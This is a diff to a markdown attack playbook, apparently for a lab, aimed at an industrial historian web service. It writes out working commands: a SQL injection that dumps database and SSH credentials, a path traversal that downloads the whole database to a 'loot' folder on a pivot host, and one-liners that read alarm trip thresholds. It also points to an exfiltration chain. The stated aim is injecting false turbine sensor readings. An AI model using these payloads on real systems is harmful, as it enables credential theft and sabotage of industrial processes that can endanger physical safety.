@@ -107,13 +107,13 @@ The web service runs on `http://10.10.2.10:8080/`. No authentication on read
 endpoints.
 
 ```powershell
-curl http://10.10.2.10:8080/status
+curl -s http://10.10.2.10:8080/status
 ```
 
 Health check. Confirms the service is running.
 
 ```powershell
-curl http://10.10.2.10:8080/assets
+curl -s http://10.10.2.10:8080/assets
 ```
 
 Returns the list of asset names the historian knows about: `turbine_rpm`,
@@ -121,12 +121,12 @@ Returns the list of asset names the historian knows about: `turbine_rpm`,
 and so on. These are the tag names needed for `/report` queries.
 
 ```powershell
-curl "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2026-01-01&to=2099-01-01"
+curl -s "http://10.10.2.10:8080/report?asset=turbine_rpm&from=2024-01-01&to=2099-01-01"
 ```
 
-Time-series data for the turbine speed sensor. Returns CSV rows going back to
-when the cron started. Useful for establishing baseline process state before
-injecting false readings.
+Time-series data for the turbine speed sensor. Returns rows within the
+historian's 30-day rolling window; `2024-01-01` predates any lab start date.
+Useful for establishing baseline process state before injecting false readings.
 
 ### SQL injection
 
@@ -134,7 +134,7 @@ The `asset` parameter in `/report` passes unsanitised into the SQL query.
 `HEX-1847`, closed as won't-fix in 2019.
 
 ```powershell
-curl "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
+curl -s "http://10.10.2.10:8080/report?asset=x'+UNION+SELECT+key,value,'x'+FROM+config--&from=0&to=9"
 ```
 
 Dumps the `config` table. Returns `db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
@@ -144,19 +144,20 @@ Dumps the `config` table. Returns `db_user`, `db_pass`, `ssh_user`, `ssh_pass`,
 
 The `tag` parameter in `/export` is not sanitised.
 
-From the attacker machine, download the entire SQLite database:
+Download the database from wizzards-retreat, which has a NIC on the same /24:
 
 ```
-curl "http://10.10.2.10:8080/export?tag=../historian.db" -o historian.db
+curl "http://10.10.2.10:8080/export?tag=../historian.db" -o /tmp/loot/historian.db
 ```
 
-Then query locally on the attacker machine:
+Then query locally on wizzards-retreat (no sqlite3 CLI; Python's module works):
 
 ```
-sqlite3 historian.db "SELECT * FROM config;"
-sqlite3 historian.db "SELECT * FROM alarm_config;"
-sqlite3 historian.db "SELECT * FROM readings WHERE asset='turbine_rpm' ORDER BY timestamp DESC LIMIT 20;"
+python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM config;')]"
+python3 -c "import sqlite3; [print(r) for r in sqlite3.connect('/tmp/loot/historian.db').execute('SELECT * FROM alarm_config;')]"
 ```
+
+Full exfil chain to unseen-gate: `books2/historian-exfil.md`.
 
 The `alarm_config` table has the trip thresholds for each asset. The `config`
 table has the full credential set. The `readings` table is the process history.
